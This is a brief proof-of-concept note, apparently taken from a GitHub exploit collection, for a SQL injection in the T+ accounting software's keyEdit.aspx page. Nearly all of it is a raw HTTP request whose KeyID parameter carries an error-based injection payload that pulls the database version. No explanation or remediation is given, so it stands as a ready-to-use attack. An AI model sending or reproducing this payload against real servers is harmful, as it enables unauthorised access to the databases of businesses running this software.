# TPlus_keyEdit.aspx_sqli
from : https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8B%E7%95%85%E6%8D%B7%E9%80%9ATPlus-keyEdit.aspx%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md

2024.5.13 @2 

```
GET /tplus/UFAQD/keyEdit.aspx?KeyID=1%27%20and%201=(select%20@@version)%20--&preload=1 HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: xx.xxx.xxx.xxx
Accept-Charset: utf-8
```
